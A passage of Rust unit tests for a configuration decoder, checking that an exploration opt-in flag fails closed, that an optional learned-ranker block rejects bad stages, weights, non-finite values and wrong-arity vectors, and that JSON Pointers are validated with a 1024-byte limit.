                m.push((txt("exploration_opt_in"), o));
            }
            Value::Map(m)
        };
        let eps = |v: &Value| decode_route(v).unwrap().exploration_epsilon;
        // Present-false + ε>0 is the M1E-3001 refusal; present-true accepts.
        assert!(matches!(
            decode_route(&route(0.05, Some(Value::Bool(false)))),
            Err(Reject::Schema { .. })
        ));
        assert_eq!(eps(&route(0.05, Some(Value::Bool(true)))), 0.05);
        assert_eq!(eps(&route(0.0, Some(Value::Bool(false)))), 0.0);
        assert!(matches!(
            decode_route(&route(0.05, Some(Value::Integer(1.into())))),
            Err(Reject::Schema { .. })
        ));
        // Absent ⇒ fail closed, same as present-false (D-EF re-freeze: the
        // carve-out `full` needed is gone; `full` now signs opt_in true).
        assert!(matches!(
            decode_route(&route(0.05, None)),
            Err(Reject::Schema { .. })
        ));
        assert_eq!(eps(&route(0.0, None)), 0.0);
    }

    #[test]
    fn learned_ranker_is_optional_closed_enum_and_bounded() {
        let txt = |s: &str| Value::Text(s.into());
        let fl = |x: f64| Value::Float(x);
        let cortex = |ranker: Option<Value>| {
            let mut m = vec![
                (
                    txt("map_budget_tokens"),
                    Value::Map(vec![
                        (txt("min"), Value::Integer(1.into())),
                        (txt("max"), Value::Integer(2.into())),
                    ]),
                ),
                (txt("channels"), Value::Array(vec![txt("session_start")])),
            ];
            if let Some(r) = ranker {
                m.push((txt("learned_ranker"), r));
            }
            Value::Map(m)
        };
        let ranker = |stage: &str, weight: f64, bias: f64, coef: Vec<Value>| {
            Value::Map(vec![
                (txt("stage"), txt(stage)),
                (txt("weight"), fl(weight)),
                (txt("bias"), fl(bias)),
                (txt("coefficients"), Value::Array(coef)),
            ])
        };
        let four = || vec![fl(0.5), fl(0.25), fl(-0.1), fl(0.0)];
        // Absent ⇒ None, never a zeroed ranker.
        assert_eq!(decode_cortex(&cortex(None)).unwrap().learned_ranker, None);
        let ok = decode_cortex(&cortex(Some(ranker("shadow", 0.5, 0.1, four()))))
            .unwrap()
            .learned_ranker
            .unwrap();
        assert_eq!(ok.stage, RankerStage::Shadow);
        assert_eq!((ok.weight, ok.bias), (0.5, 0.1));
        assert_eq!(ok.coefficients, [0.5, 0.25, -0.1, 0.0]);
        for stage in ["probation", "active"] {
            assert!(decode_cortex(&cortex(Some(ranker(stage, 1.0, 0.0, four())))).is_ok());
        }
        assert!(decode_cortex(&cortex(Some(ranker("shadow", 0.0, 0.0, four())))).is_ok());
        // Every refusal is M1E-3001 schema: a closed-enum miss, weight outside
        // [0,1], non-finite anywhere, a wrong-arity vector, a stray key.
        let bad = [
            ranker("canary", 0.5, 0.0, four()),
            ranker("shadow", 1.5, 0.0, four()),
            ranker("shadow", -0.1, 0.0, four()),
            ranker("shadow", f64::NAN, 0.0, four()),
            ranker("shadow", 0.5, f64::INFINITY, four()),
            ranker(
                "shadow",
                0.5,
                0.0,
                vec![fl(0.0), fl(0.0), fl(f64::NAN), fl(0.0)],
            ),
            ranker("shadow", 0.5, 0.0, vec![fl(0.0); 3]),
            ranker("shadow", 0.5, 0.0, vec![fl(0.0); 5]),
            Value::Map(vec![(txt("stage"), txt("shadow"))]),
            Value::Map(vec![
                (txt("stage"), txt("shadow")),
                (txt("weight"), fl(0.5)),
                (txt("bias"), fl(0.0)),
                (txt("coefficients"), Value::Array(four())),
                (txt("model"), txt("x")),
            ]),
        ];
        for (i, r) in bad.into_iter().enumerate() {
            assert!(
                matches!(decode_cortex(&cortex(Some(r))), Err(Reject::Schema { .. })),
                "bad ranker #{i} accepted"
            );
        }
    }

    #[test]
    fn json_pointer_production() {
        for good in ["", "/message/usage/input_tokens", "/a~0b/c~1d", "/", "//"] {
            assert!(is_json_pointer(good), "rejected {good:?}");
        }
        for bad in ["message", "~0", "/a~", "/a~2b"] {
            assert!(!is_json_pointer(bad), "accepted {bad:?}");
        }
        // 07's .size (0..1024): 1024 bytes is the ceiling, 1025 is out — the
        // review's 4001-char pointer must no longer fit in a signed bundle.
        assert!(is_json_pointer(&format!("/{}", "a".repeat(1023))));
        assert!(!is_json_pointer(&format!("/{}", "a".repeat(1024))));
        assert!(!is_json_pointer(&format!("/{}", "a".repeat(4000))));
    }
}
